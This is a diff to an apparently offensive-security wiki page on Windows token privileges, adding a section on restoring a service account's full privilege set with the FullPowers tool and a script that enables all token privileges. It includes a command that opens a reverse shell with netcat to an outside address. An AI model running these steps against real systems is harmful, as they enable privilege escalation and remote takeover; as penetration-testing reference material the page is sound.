@@ -30,14 +30,32 @@ whoami /priv
 
 The **tokens that appear as Disabled** can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens.
 
-### Enable All the tokens
+### Enable/Recover All the tokens
 
+{% tabs %}
+{% tab title="Second Tab" %}
+On Windows, some services executed as `LOCAL SERVICE` or `NETWORK SERVICE` are configured to **run with a restricted set of privileges**. However, when you **create a scheduled task**, the new process created by the **Task Scheduler Service** has **all the default privileges** of the associated user account (except _SeImpersonate_). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.
+
+We can use [FullPowers](https://github.com/itm4n/FullPowers) to recover the default privilege set of a LOCAL/NETWORK SERVICE account:
+
+```powershell
+#Specify a commandline
+.\FullPowers -c "cmd.exe"
+
+#Spawn a revers shell and exit
+.\FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+{% endtab %}
+
+{% tab title="EnableAllTokenPrivs" %}
 You can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:
 
 ```powershell
 .\EnableAllTokenPrivs.ps1
 whoami /priv
 ```
+{% endtab %}
+{% endtabs %}
 
 ### SeImpersonatePrivilege
 
